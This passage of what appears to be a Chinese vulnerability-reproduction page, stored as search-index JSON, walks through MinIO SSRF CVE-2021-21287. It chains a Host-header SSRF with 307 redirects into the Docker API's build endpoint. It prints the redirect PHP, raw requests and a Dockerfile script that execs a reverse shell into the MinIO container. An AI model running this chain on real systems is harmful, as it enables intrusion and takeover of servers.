\u8fd8\u8bb0\u5f97\u6211\u4eec\u662f\u600e\u6837\u83b7\u5f97\u8fd9\u4e2aGET\u578b\u7684SSRF\u7684\u5417\uff1f\u901a\u8fc7302\u8df3\u8f6c\uff0c\u800c\u63a5\u53d7\u7b2c\u4e00\u6b21\u8df3\u8f6c\u7684\u8bf7\u6c42\u5c31\u662f\u4e00\u4e2aPOST\u8bf7\u6c42\u3002\u4e0d\u8fc7\u6211\u4eec\u6ca1\u6cd5\u76f4\u63a5\u5229\u7528\u8fd9\u4e2aPOST\u8bf7\u6c42\uff0c\u56e0\u4e3a\u4ed6\u7684Path\u4e0d\u53ef\u63a7\u3002 \u5982\u4f55\u6784\u9020\u4e00\u4e2aPath\u53ef\u63a7\u7684POST\u8bf7\u6c42\u5462\uff1f \u6211\u60f3\u5230\u4e86307\u8df3\u8f6c\uff0c307\u8df3\u8f6c\u662f\u5728 RFC 7231 \u4e2d\u5b9a\u4e49\u7684\u4e00\u79cdHTTP\u72b6\u6001\u7801\uff0c\u63cf\u8ff0\u5982\u4e0b\uff1a The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. 307\u8df3\u8f6c\u7684\u7279\u70b9\u5c31\u662f**\u4e0d\u4f1a**\u6539\u53d8\u539f\u59cb\u8bf7\u6c42\u7684\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u670d\u52a1\u7aef\u8fd4\u56de307\u72b6\u6001\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u4f1a\u6309\u7167Location\u6307\u5411\u7684\u5730\u5740\u53d1\u9001\u4e00\u4e2a\u76f8\u540c\u65b9\u6cd5\u7684\u8bf7\u6c42\u3002 \u6211\u4eec\u6b63\u597d\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u6765\u83b7\u5f97POST\u8bf7\u6c42\u3002 \u7b80\u5355\u4fee\u6539\u4e00\u4e0b\u4e4b\u524d\u7684index.php\uff1a <?php header ( 'Location: http://192.168.1.142:4444/attack?arbitrary=params' , false , 307 ); \u5c1d\u8bd5SSRF\u653b\u51fb\uff0c\u6536\u5230\u4e86\u9884\u671f\u7684\u8bf7\u6c42\uff1a Bingo\uff0c\u83b7\u5f97\u4e86\u4e00\u4e2aPOST\u8bf7\u6c42\u7684SSRF\uff0c\u867d\u7136\u6ca1\u6709Body\u3002 \u56de\u5230Docker API\uff0c\u6211\u53d1\u73b0\u73b0\u5728\u4ecd\u7136\u6ca1\u6cd5\u5bf9run\u548cexec\u4e24\u4e2aAPI\u505a\u5229\u7528\uff0c\u539f\u56e0\u662f\uff0c\u8fd9\u4e24\u4e2aAPI\u90fd\u9700\u8981\u5728\u8bf7\u6c42Body\u4e2d\u4f20\u8f93JSON\u683c\u5f0f\u7684\u53c2\u6570\uff0c\u800c\u6211\u4eec\u8fd9\u91cc\u7684SSRF\u65e0\u6cd5\u63a7\u5236Body\u3002 \u7ee7\u7eed\u7ffb\u8d8aDocker\u6587\u6863\uff0c\u6211\u53d1\u73b0\u4e86\u53e6\u4e00\u4e2aAPI\uff0c Build an image \uff1a \u8fd9\u4e2aAPI\u7684\u5927\u90e8\u5206\u53c2\u6570\u662f\u901a\u8fc7Query Parameters\u4f20\u8f93\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u3002\u9605\u8bfb\u5176\u4e2d\u7684\u9009\u9879\uff0c\u53d1\u73b0\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u540d\u4e3a remote \u7684\u53c2\u6570\uff0c\u5176\u8bf4\u660e\u4e3a\uff1a A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file\u2019s contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball. \u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2aGit\u5730\u5740\u6216\u8005\u4e00\u4e2aHTTP URL\uff0c\u5185\u5bb9\u662f\u4e00\u4e2aDockerfile\u6216\u8005\u4e00\u4e2a\u5305\u542b\u4e86Dockerfile\u7684Git\u9879\u76ee\u6216\u8005\u4e00\u4e2a\u538b\u7f29\u5305\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0cDocker API\u652f\u6301\u901a\u8fc7\u6307\u5b9a\u8fdc\u7a0bURL\u7684\u65b9\u5f0f\u6765\u6784\u5efa\u955c\u50cf\uff0c\u800c\u4e0d\u9700\u8981\u6211\u5728\u672c\u5730\u5199\u5165\u4e00\u4e2aDockerfile\u3002 \u6240\u4ee5\uff0c\u6211\u5c1d\u8bd5\u7f16\u5199\u4e86\u8fd9\u6837\u4e00\u4e2aDockerfile\uff0c\u770b\u770b\u662f\u5426\u80fd\u591fbuild\u8fd9\u4e2a\u955c\u50cf\uff0c\u5982\u679c\u53ef\u4ee5\uff0c\u90a3\u4e48\u6211\u76844444\u7aef\u53e3\u5e94\u8be5\u80fd\u6536\u5230wget\u7684\u8bf7\u6c42\uff1a FROM alpine:3.13 RUN wget -T4 http://192.168.1.142:4444/docker/build \u7136\u540e\u4fee\u6539\u524d\u9762\u7684index.php\uff0c\u6307\u5411Docker\u96c6\u7fa4\u76842375\u7aef\u53e3\uff1a <?php header('Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&nocache=true&t=evil:1', false, 307); \u8fdb\u884cSSRF\u653b\u51fb\uff0c\u7b49\u5f85\u4e86\u4e00\u4f1a\u513f\uff0c\u679c\u7136\u6536\u5230\u8bf7\u6c42\u4e86\uff1a \u5b8c\u7f8e\uff0c\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u5728\u76ee\u6807\u96c6\u7fa4\u5bb9\u5668\u91cc\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002 \u6b64\u65f6\u79bb\u6211\u4eec\u7684\u76ee\u6807\uff0c\u62ff\u4e0bMinIO\uff0c\u8fd8\u5dee\u4e00\u70b9\u70b9\uff0c\u540e\u9762\u7684\u653b\u51fb\u5176\u5b9e\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86\u3002 \u56e0\u4e3a\u73b0\u5728\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u6211\u4eec\u5c31\u4e0d\u4f1a\u518d\u53d7\u5230SSRF\u6f0f\u6d1e\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u76f4\u63a5\u53cd\u5f39\u4e00\u4e2ashell\uff0c\u6216\u8005\u53ef\u4ee5\u76f4\u63a5\u53d1\u9001\u4efb\u610f\u6570\u636e\u5305\u5230Docker API\uff0c\u6765\u8bbf\u95ee\u5bb9\u5668\u3002\u7ecf\u8fc7\u4e00\u987f\u6d4b\u8bd5\uff0c\u6211\u53d1\u73b0MinIO\u867d\u7136\u662f\u8fd0\u884c\u7684\u4e00\u4e2aservice\uff0c\u4f46\u5b9e\u9645\u4e0a\u5c31\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668\u3002 \u6240\u4ee5\u6211\u7f16\u5199\u4e86\u4e00\u4e2a\u81ea\u52a8\u5316\u653b\u51fbMinIO\u5bb9\u5668\u7684\u811a\u672c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u4e86Dockerfile\u4e2d\uff0c\u8ba9\u5176\u5728Build\u7684\u65f6\u5019\u8fdb\u884c\u653b\u51fb\uff0c\u5229\u7528 docker exec \u5728MinIO\u7684\u5bb9\u5668\u91cc\u6267\u884c\u53cd\u5f39shell\u7684\u547d\u4ee4\u3002\u8fd9\u4e2aDockerfile\u5982\u4e0b\uff1a FROM alpine:3.13 RUN apk add curl bash jq RUN set -ex && \\ { \\ echo '#!/bin/bash' ; \\ echo 'set -ex' ; \\ echo 'target=\"http://192.168.227.131:2375\"' ; \\ echo 'jsons=$(curl -s -XGET \"${target}/containers/json\" | jq -r \".[] | @base64\")' ; \\ echo 'for item in ${jsons[@]}; do' ; \\ echo ' name=$(echo $item | base64 -d | jq -r \".Image\")' ; \\ echo ' if [[ \"$name\" == *\"minio/minio\"* ]]; then' ; \\ echo ' id=$(echo $item | base64 -d | jq -r \".Id\")' ; \\ echo ' break' ; \\ echo ' fi' ; \\ echo 'done' ; \\ echo 'execid=$(curl -s -X POST \"${target}/containers/${id}/exec\" -H \"Content-Type: application/json\" --data-binary \"{\\\"Cmd\\\": [\\\"bash\\\", \\\"-c\\\", \\\"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\\\"]}\" | jq -r \".Id\")' ; \\ echo 'curl -s -X POST \"${target}/exec/${execid}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\"' ; \\ } | bash \u8fd9\u4e2a\u811a\u672c\u6240\u5e72\u7684\u4e8b\u60c5\u6bd4\u8f83\u7b80\u5355\uff0c\u4e00\u4e2a\u662f\u904d\u5386\u4e86\u6240\u6709\u5bb9\u5668\uff0c\u5982\u679c\u53d1\u73b0\u5176\u955c\u50cf\u7684\u540d\u5b57\u4e2d\u5305\u542b minio/minio \uff0c\u5219\u8ba4\u4e3a\u8fd9\u4e2a\u5bb9\u5668\u5c31\u662fMinIO\u6240\u5728\u7684\u5bb9\u5668\u3002\u62ff\u5230\u8fd9\u4e2a\u5bb9\u5668\u7684Id\uff0c\u7528exec\u7684API\uff0c\u5728\u5176\u4e2d\u6267\u884c\u53cd\u5f39shell\u7684\u547d\u4ee4 Youtube \u6f14\u793a\u94fe\u63a5 \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7Docker API\u6765\u83b7\u53d6\u96c6\u7fa4\u6743\u9650 \u53c2\u8003\u6587\u7ae0 \u00b6 https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html","title":"MinIO SSRF\u6f0f\u6d1e CVE-2021-21287"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MinIO/MinIO%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/#minio-ssrf\u6f0f\u6d1e-cve-2021-21287","text":"","title":"MinIO SSRF\u6f0f\u6d1e CVE-2021-21287"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MinIO/MinIO%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u968f\u7740\u5de5\u4f5c\u548c\u751f\u6d3b\u4e2d\u7684\u4e00\u4e9b\u73af\u5883\u9010\u6e10\u5f80\u4e91\u7aef\u8fc1\u79fb\uff0c\u5bf9\u8c61\u5b58\u50a8\u7684\u9700\u6c42\u4e5f\u9010\u6e10\u591a\u4e86\u8d77\u6765\uff0c MinIO \u5c31\u662f\u4e00\u6b3e\u652f\u6301\u90e8\u7f72\u5728\u79c1\u6709\u4e91\u7684\u5f00\u6e90\u5bf9\u8c61\u5b58\u50a8\u7cfb\u7edf\u3002MinIO\u5b8c\u5168\u517c\u5bb9AWS S3\u7684\u534f\u8bae\uff0c\u4e5f\u652f\u6301\u4f5c\u4e3aS3\u7684\u7f51\u5173\uff0c\u6240\u4ee5\u5728\u5168\u7403\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u5728Github\u4e0a\u5df2\u670925k\u661f\u661f\u3002MinIO\u4e2d\u5b58\u5728SSRF\u6f0f\u6d1e\uff0c\u901a\u8fc7\u6f0f\u6d1e\u53ef\u4ee5\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u6216\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MinIO/MinIO%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] MinIO","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MinIO/MinIO%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/#\u6f0f\u6d1e\u590d\u73b0","text":"\u65e2\u7136\u6211\u4eec\u9009\u62e9\u4e86\u4eceMinIO\u5165\u624b\uff0c\u90a3\u4e48\u5148\u4e86\u89e3\u4e00\u4e0bMinIO\u3002\u5176\u5b9e\u6211\u524d\u9762\u4e5f\u8bf4\u4e86\uff0c\u56e0\u4e3a\u5e73\u65f6\u7528\u5230MinIO\u7684\u65f6\u5019\u5f88\u591a\uff0c\u6240\u4ee5\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7701\u7565\u4e86\u3002\u5176\u4f7f\u7528Go\u5f00\u53d1\uff0c\u63d0\u4f9bHTTP\u63a5\u53e3\uff0c\u800c\u4e14\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a\u524d\u7aef\u9875\u9762\uff0c\u540d\u4e3a\u201cMinIO Browser\u201d\u3002\u5f53\u7136\uff0c\u524d\u7aef\u9875\u9762\u5c31\u662f\u4e00\u4e2a\u767b\u9646\u63a5\u53e3\uff0c\u4e0d\u77e5\u9053\u53e3\u4ee4\u65e0\u6cd5\u767b\u5f55\u3002 \u90a3\u4e48\u4ece\u5165\u53e3\u70b9\uff08\u524d\u7aef\u63a5\u53e3\uff09\u5f00\u59cb\u5bf9\u5176\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1\u5427\u3002 \u5728User-Agent\u6ee1\u8db3\u6b63\u5219 .*Mozilla.* \u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5373\u53ef\u8bbf\u95eeMinIO\u7684\u524d\u7aef\u63a5\u53e3\uff0c\u524d\u7aef\u63a5\u53e3\u662f\u4e00\u4e2a\u81ea\u5df1\u5b9e\u73b0\u7684JsonRPC\uff1a \u6211\u4eec\u611f\u5174\u8da3\u7684\u5c31\u662f\u5176\u9274\u6743\u7684\u65b9\u6cd5\uff0c\u968f\u4fbf\u627e\u5230\u4e00\u4e2aRPC\u65b9\u6cd5\uff0c\u53ef\u89c1\u5176\u5f00\u5934\u8c03\u7528\u4e86 webRequestAuthenticate \uff0c\u8ddf\u8fdb\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u8fd9\u91cc\u7528\u7684\u662fjwt\u9274\u6743\uff1a jwt\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709\u4e0b\u9762\u8fd9\u51e0\u79cd\uff1a \u5c06alg\u8bbe\u7f6e\u4e3aNone\uff0c\u544a\u8bc9\u670d\u52a1\u5668\u4e0d\u8fdb\u884c\u7b7e\u540d\u6821\u9a8c \u5982\u679calg\u4e3aRSA\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u4e3aHS256\uff0c\u5373\u544a\u8bc9\u670d\u52a1\u5668\u4f7f\u7528\u516c\u94a5\u8fdb\u884c\u7b7e\u540d\u7684\u6821\u9a8c \u7206\u7834\u7b7e\u540d\u5bc6\u94a5 \u67e5\u770bMinIO\u7684JWT\u6a21\u5757\uff0c\u53d1\u73b0\u5176\u4e2d\u5bf9alg\u8fdb\u884c\u4e86\u6821\u9a8c\uff0c\u53ea\u5141\u8bb8\u4ee5\u4e0b\u4e09\u79cd\u7b7e\u540d\u65b9\u6cd5\uff1a \u8fd9\u5c31\u5835\u6b7b\u4e86\u524d\u4e24\u79cd\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u7206\u7834\u5f53\u7136\u5c31\u66f4\u522b\u8bf4\u4e86\uff0c\u901a\u5e38\u4ec5\u4f5c\u4e3a\u6ca1\u529e\u6cd5\u7684\u60c5\u51b5\u4e0b\u7684\u624b\u6bb5\u3002\u5f53\u7136\uff0cMinIO\u4e2d\u4f7f\u7528\u7528\u6237\u7684\u5bc6\u7801\u4f5c\u4e3a\u7b7e\u540d\u7684\u5bc6\u94a5\uff0c\u8fd9\u4e2a\u5176\u5b9e\u4f1a\u8ba9\u7206\u7834\u53d8\u5730\u7b80\u5355\u4e00\u4e9b\u3002 \u9274\u6743\u8fd9\u5757\u6ca1\u5565\u7a81\u7834\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u770b\uff0c\u6709\u54ea\u4e9bRPC\u63a5\u53e3\u6ca1\u6709\u8fdb\u884c\u6743\u9650\u9a8c\u8bc1\u3002 \u5f88\u5feb\u627e\u5230\u4e86\u4e00\u4e2a\u63a5\u53e3\uff0c LoginSTS \u3002\u8fd9\u4e2a\u63a5\u53e3\u5176\u5b9e\u662fAWS STS\u767b\u5f55\u63a5\u53e3\u7684\u4e00\u4e2a\u4ee3\u7406\uff0c\u7528\u4e8e\u5c06\u53d1\u9001\u5230JsonRPC\u7684\u8bf7\u6c42\u8f6c\u53d8\u6210STS\u7684\u65b9\u5f0f\u8f6c\u53d1\u7ed9\u672c\u5730\u76849000\u7aef\u53e3\uff08\u4e5f\u5c31\u8fd8\u662f\u4ed6\u81ea\u5df1\uff0c\u56e0\u4e3a\u5b83\u662f\u517c\u5bb9AWS\u534f\u8bae\u7684\uff09\u3002 \u7b80\u5316\u5176\u4ee3\u7801\u5982\u4e0b\uff1a // LoginSTS - STS user login handler. func ( web * webAPIHandlers ) LoginSTS ( r * http . Request , args * LoginSTSArgs , reply * LoginRep ) error { ctx := newWebContext ( r , args , \"WebLoginSTS\" ) v := url . Values {} v . Set ( \"Action\" , webIdentity ) v . Set ( \"WebIdentityToken\" , args . Token ) v . Set ( \"Version\" , stsAPIVersion ) scheme := \"http\" // ... u := & url . URL { Scheme : scheme , Host : r . Host , } u . RawQuery = v . Encode () req , err := http . NewRequest ( http . MethodPost , u . String (), nil ) // ... } \u6ca1\u53d1\u73b0\u6709\u9274\u6743\u4e0a\u7684\u7ed5\u8fc7\u95ee\u9898\uff0c\u4f46\u662f\u53d1\u73b0\u4e86\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u95ee\u9898\u3002\u8fd9\u91cc\uff0cMinIO\u4e3a\u4e86\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u201c\u81ea\u5df1\u201d\uff0c\u5c31\u4ece\u7528\u6237\u53d1\u9001\u7684HTTP\u5934Host\u4e2d\u83b7\u53d6\u5230\u201c\u81ea\u5df1\u7684\u5730\u5740\u201d\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3aURL\u7684Host\u6784\u9020\u4e86\u65b0\u7684URL\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u6709\u4ec0\u4e48\u95ee\u9898\u5462\uff1f \u56e0\u4e3a\u8bf7\u6c42\u5934\u662f\u7528\u6237\u53ef\u63a7\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u6784\u9020\u4efb\u610f\u7684Host\uff0c\u8fdb\u800c\u6784\u9020\u4e00\u4e2aSSRF\u6f0f\u6d1e\u3002 \u6211\u4eec\u6765\u5b9e\u9645\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u5411 http://192.168.227.131:9000 \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\uff0c\u5176\u4e2dHost\u7684\u503c\u662f\u6211\u672c\u5730ncat\u5f00\u653e\u7684\u7aef\u53e3\uff08 192.168.1.142:4444 \uff09\uff1a POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} \u6210\u529f\u6536\u5230\u8bf7\u6c42\uff1a \u53ef\u4ee5\u786e\u5b9a\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aSSRF\u6f0f\u6d1e\u4e86\u3002 \u4ed4\u7ec6\u89c2\u5bdf\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2aPOST\u8bf7\u6c42\uff0c\u4f46\u662fPath\u548cBody\u90fd\u6ca1\u6cd5\u63a7\u5236\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u7684\u53ea\u6709URL\u4e2d\u7684\u4e00\u4e2a\u53c2\u6570 WebIdentityToken \u3002 \u4f46\u662f\u8fd9\u4e2a\u53c2\u6570\u7ecf\u8fc7\u4e86URL\u7f16\u7801\uff0c\u65e0\u6cd5\u6ce8\u5165\u6362\u884c\u7b26\u7b49\u5176\u4ed6\u7279\u6b8a\u5b57\u7b26\u3002\u8fd9\u6837\u5c31\u6bd4\u8f83\u9e21\u808b\u4e86\uff0c\u5982\u679c\u4ec5\u4ece\u73b0\u5728\u6765\u770b\uff0c\u8fd9\u4e2aSSRF\u53ea\u80fd\u7528\u4e8e\u626b\u63cf\u7aef\u53e3\u3002\u6211\u4eec\u7684\u76ee\u6807\u5f53\u7136\u4e0d\u4ec5\u9650\u4e8e\u6b64\u3002 \u5e78\u8fd0\u7684\u662f\uff0cGo\u9ed8\u8ba4\u7684http\u5e93\u4f1a\u8ddf\u8e2a302\u8df3\u8f6c\uff0c\u800c\u4e14\u4e0d\u8bba\u662fGET\u8fd8\u662fPOST\u8bf7\u6c42\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5302\u8df3\u8f6c\u6765\u201c\u5347\u7ea7\u201dSSRF\u6f0f\u6d1e\u3002 \u4f7f\u7528PHP\u6765\u7b80\u5355\u5730\u6784\u9020\u4e00\u4e2a302\u8df3\u8f6c\uff1a <?php header ( 'Location: http://192.168.1.142:4444/attack?arbitrary=params' ); \u5c06\u5176\u4fdd\u5b58\u6210index.php\uff0c\u542f\u52a8\u4e00\u4e2aPHP\u670d\u52a1\u5668\uff1a \u5c06Host\u6307\u5411\u8fd9\u4e2aPHP\u670d\u52a1\u5668\u3002\u8fd9\u6837\uff0c\u7ecf\u8fc7\u4e00\u6b21302\u8df3\u8f6c\uff0c\u6211\u4eec\u6536\u83b7\u4e86\u4e00\u4e2a\u53ef\u4ee5\u63a7\u5236\u5b8c\u6574URL\u7684GET\u8bf7\u6c42\uff1a \u653e\u5bbd\u4e86\u4e00\u4e9b\u9650\u5236\uff0c\u7ed3\u5408\u524d\u9762\u6211\u5bf9\u8fd9\u5957\u5185\u7f51\u7684\u4e86\u89e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u653b\u51fbDocker\u96c6\u7fa4\u76842375\u7aef\u53e3\u3002 2375\u662fDocker API\u7684\u63a5\u53e3\uff0c\u4f7f\u7528HTTP\u534f\u8bae\u901a\u4fe1\uff0c\u9ed8\u8ba4\u4e0d\u4f1a\u76d1\u542cTCP\u5730\u5740\uff0c\u8fd9\u91cc\u53ef\u80fd\u662f\u4e3a\u4e86\u65b9\u4fbf\u5185\u7f51\u5176\u4ed6\u673a\u5668\u4f7f\u7528\u6240\u4ee5\u5f00\u653e\u5728\u5185\u7f51\u7684\u5730\u5740\u91cc\u4e86\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u901a\u8fc7SSRF\u6765\u653b\u51fb\u8fd9\u4e2a\u63a5\u53e3\u5462\uff1f \u5728Docker\u672a\u6388\u6743\u8bbf\u95ee\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528 docker run \u6216 docker exec \u6765\u5728\u76ee\u6807\u5bb9\u5668\u91cc\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff08\u5982\u679c\u4f60\u4e0d\u4e86\u89e3\uff0c\u53ef\u4ee5\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 \uff09\u3002\u4f46\u662f\u7ffb\u9605Docker\u7684\u6587\u6863\u53ef\u77e5\uff0c\u8fd9\u4e24\u4e2a\u64cd\u4f5c\u7684\u8bf7\u6c42\u662f POST /containers/create \u548c POST /containers/{id}/exec \u3002 \u4e24\u4e2aAPI\u90fd\u662fPOST\u8bf7\u6c42\uff0c\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u7684SSRF\u5374\u662f\u4e00\u4e2aGET\u7684\u3002\u600e\u4e48\u529e\u5462\uff1f \u8fd8\u8bb0\u5f97\u6211\u4eec\u662f\u600e\u6837\u83b7\u5f97\u8fd9\u4e2aGET\u578b\u7684SSRF\u7684\u5417\uff1f\u901a\u8fc7302\u8df3\u8f6c\uff0c\u800c\u63a5\u53d7\u7b2c\u4e00\u6b21\u8df3\u8f6c\u7684\u8bf7\u6c42\u5c31\u662f\u4e00\u4e2aPOST\u8bf7\u6c42\u3002\u4e0d\u8fc7\u6211\u4eec\u6ca1\u6cd5\u76f4\u63a5\u5229\u7528\u8fd9\u4e2aPOST\u8bf7\u6c42\uff0c\u56e0\u4e3a\u4ed6\u7684Path\u4e0d\u53ef\u63a7\u3002 \u5982\u4f55\u6784\u9020\u4e00\u4e2aPath\u53ef\u63a7\u7684POST\u8bf7\u6c42\u5462\uff1f \u6211\u60f3\u5230\u4e86307\u8df3\u8f6c\uff0c307\u8df3\u8f6c\u662f\u5728 RFC 7231 \u4e2d\u5b9a\u4e49\u7684\u4e00\u79cdHTTP\u72b6\u6001\u7801\uff0c\u63cf\u8ff0\u5982\u4e0b\uff1a The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. 307\u8df3\u8f6c\u7684\u7279\u70b9\u5c31\u662f**\u4e0d\u4f1a**\u6539\u53d8\u539f\u59cb\u8bf7\u6c42\u7684\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u670d\u52a1\u7aef\u8fd4\u56de307\u72b6\u6001\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u4f1a\u6309\u7167Location\u6307\u5411\u7684\u5730\u5740\u53d1\u9001\u4e00\u4e2a\u76f8\u540c\u65b9\u6cd5\u7684\u8bf7\u6c42\u3002 \u6211\u4eec\u6b63\u597d\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u6765\u83b7\u5f97POST\u8bf7\u6c42\u3002 \u7b80\u5355\u4fee\u6539\u4e00\u4e0b\u4e4b\u524d\u7684index.php\uff1a <?php header ( 'Location: http://192.168.1.142:4444/attack?arbitrary=params' , false , 307 ); \u5c1d\u8bd5SSRF\u653b\u51fb\uff0c\u6536\u5230\u4e86\u9884\u671f\u7684\u8bf7\u6c42\uff1a Bingo\uff0c\u83b7\u5f97\u4e86\u4e00\u4e2aPOST\u8bf7\u6c42\u7684SSRF\uff0c\u867d\u7136\u6ca1\u6709Body\u3002 \u56de\u5230Docker API\uff0c\u6211\u53d1\u73b0\u73b0\u5728\u4ecd\u7136\u6ca1\u6cd5\u5bf9run\u548cexec\u4e24\u4e2aAPI\u505a\u5229\u7528\uff0c\u539f\u56e0\u662f\uff0c\u8fd9\u4e24\u4e2aAPI\u90fd\u9700\u8981\u5728\u8bf7\u6c42Body\u4e2d\u4f20\u8f93JSON\u683c\u5f0f\u7684\u53c2\u6570\uff0c\u800c\u6211\u4eec\u8fd9\u91cc\u7684SSRF\u65e0\u6cd5\u63a7\u5236Body\u3002 \u7ee7\u7eed\u7ffb\u8d8aDocker\u6587\u6863\uff0c\u6211\u53d1\u73b0\u4e86\u53e6\u4e00\u4e2aAPI\uff0c Build an image \uff1a \u8fd9\u4e2aAPI\u7684\u5927\u90e8\u5206\u53c2\u6570\u662f\u901a\u8fc7Query Parameters\u4f20\u8f93\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u3002\u9605\u8bfb\u5176\u4e2d\u7684\u9009\u9879\uff0c\u53d1\u73b0\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u540d\u4e3a remote \u7684\u53c2\u6570\uff0c\u5176\u8bf4\u660e\u4e3a\uff1a A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file\u2019s contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball. \u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2aGit\u5730\u5740\u6216\u8005\u4e00\u4e2aHTTP URL\uff0c\u5185\u5bb9\u662f\u4e00\u4e2aDockerfile\u6216\u8005\u4e00\u4e2a\u5305\u542b\u4e86Dockerfile\u7684Git\u9879\u76ee\u6216\u8005\u4e00\u4e2a\u538b\u7f29\u5305\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0cDocker API\u652f\u6301\u901a\u8fc7\u6307\u5b9a\u8fdc\u7a0bURL\u7684\u65b9\u5f0f\u6765\u6784\u5efa\u955c\u50cf\uff0c\u800c\u4e0d\u9700\u8981\u6211\u5728\u672c\u5730\u5199\u5165\u4e00\u4e2aDockerfile\u3002 